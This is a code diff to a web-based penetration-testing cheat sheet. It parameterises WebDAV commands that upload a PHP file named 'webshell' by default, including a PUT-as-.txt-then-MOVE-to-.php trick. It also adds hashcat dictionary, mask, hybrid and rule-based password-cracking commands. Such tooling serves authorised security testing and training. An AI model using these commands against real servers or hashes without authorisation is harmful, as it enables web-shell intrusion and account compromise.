@@ -50,14 +50,29 @@ $(function () {
   // --- Setup web application penetration test list ---
   STORAGE_KEY = 'WEB_ENV';
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
-  const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1/';
+  const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1';
+  const webFilename = (storageInfo && storageInfo.FILENAME) || 'webshell';
   const web = new Web('#mytoolWeb', ['#webList'], {
     'URL': '#webInputURL',
+    'FILENAME': '#webInputFILENAME',
     'SUBMIT': '#webInputSubmit',
   })
   web.STORAGE_KEY = STORAGE_KEY;
-  web.setup(webURL);
-  web.draw(webURL);
+  web.setup(webURL, webFilename);
+  web.draw(webURL, webFilename);
+
+  // --- Setup password cracking list ---
+  STORAGE_KEY = 'PASSCRACKING_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const passcrackFilename = (storageInfo && storageInfo.FILENAME) || 'hash.txt';
+  const passcrack = new PassCrack('#mytoolPassCrack', ['#passcrackList'], {
+    'FILENAME': '#passcrackInputFILENAME',
+    'SUBMIT': '#passcrackInputSubmit',
+  })
+  passcrack.STORAGE_KEY = STORAGE_KEY;
+  passcrack.setup(passcrackFilename);
+  passcrack.draw(passcrackFilename);
+
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
   const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
@@ -404,18 +419,19 @@ class Web extends MyTool {
       {'title': 'gobuster', 'cmd': 'gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "{0}"'},
       {'title': 'nikto', 'cmd': 'nikto --url "{0}"'},
       {'title': 'WebDAV', 'cmd': 'davtest -url "{0}"'},
-      {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/UPLOADFILE.php' -d @UPLOADFILE.php`},
-      {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/UPLOADFILE.txt' --data-binary @UPLOADFILE.php`},
-      {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/UPLOADFILE.txt' --header 'Destination: {0}/UPLOADFILE.php'`},
-    ]
+      {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/{1}.php' -d @{1}.php`},
+      {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/{1}.txt' --data-binary @{1}.php`},
+      {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/{1}.txt' --header 'Destination: {0}/{1}.php'`},
+    ];
   }
 
-  drawList(index, targetContent, url) {
+  drawList(index, targetContent, url, filename) {
     for (let i = 0; i < targetContent.length; i++) {
       const content = targetContent[i];
       let title = content.title;
       let cmd = content.cmd;
       cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(url)}</span>`);
+      cmd = cmd.replaceAll('{1}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
       // Template
       $(this.targetCSSSelectors[index]).append(`
       <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
@@ -430,7 +446,46 @@ class Web extends MyTool {
   }
 }
 
+// ---- Password Cracking ------------------------------------------------------
+class PassCrack extends MyTool {
+  constructor(...args) {
+    super(...args);
 
+    this.targetContents['1'] = [
+      {'title': 'hashid (with Hashcat hash mode)', 'cmd': 'hashid -m {0}'},
+      {'title': 'Example hashes', 'cmd': 'hashcat --example-hashes | less'},
+      {'title': 'Dictionary attack', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt'},
+      {'title': 'Combination attack', 'cmd': 'hashcat -a 1 -m HASHMODE {0} WORDLIST1.txt WORDLIST2.txt'},
+      {'title': 'Mask Attack', 'cmd': `hashcat -a 3 -m HASHMODE {0} -1 012 'P@ssw0rd20?1?d'`, 'memo': `<ul><li>?l = abcdefghijklmnopqrstuvwxyz</li><li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>?d = 0123456789</li><li>?h = 0123456789abcdef</li><li>?H = 0123456789ABCDEF</li><li>?s = «space»!"#$%&'()*+,-./:;&amp;lt;=&gt;?@[\]^_\`{|}~</li><li>?a = ?l?u?d?s</li><li>?1, ?2, ?3, ?4 = Custom Charsets from -1, -2, -3, -4</li></ul>`},
+      {'title': 'Hybrid Mode (Prepend)', 'cmd': `hashcat -a 6 -m HASHMODE {0} -1=012 '20?1?d' /usr/share/wordlists/rockyou.txt`, 'memo': '2015Password'},
+      {'title': 'Hybrid Mode (Append)', 'cmd': `hashcat -a 7 -m HASHMODE {0} -1=012 '20?1?d' /usr/share/wordlists/rockyou.txt`, 'memo': 'Password2015'},
+      {'title': 'Hashcat Rule', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule'},
+      {'title': '1. Create Custom Hashcat Rule', 'cmd': `echo 'so0 si1 se3 ss5 sa@ c $2 $0 $1 $9' > rule.txt`, 'memo': '<ul><li>l = Convert all letters to lowercase</li><li>u = Convert all letters to uppercase</li><li>c = Capitalize first letter and invert the rest</li><li>^X = Prepend character X</li><li>$X = Append character X</li><li>r = Reverse</li></ul>'},
+      {'title': '2. Apply Custom Hashcat Rule', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt -r rule.txt'},
+    ];
+  }
+
+  drawList(index, targetContent, filename) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      let memo = content.memo || "";
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+          ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
 
 
 function htmlEscape(str) {
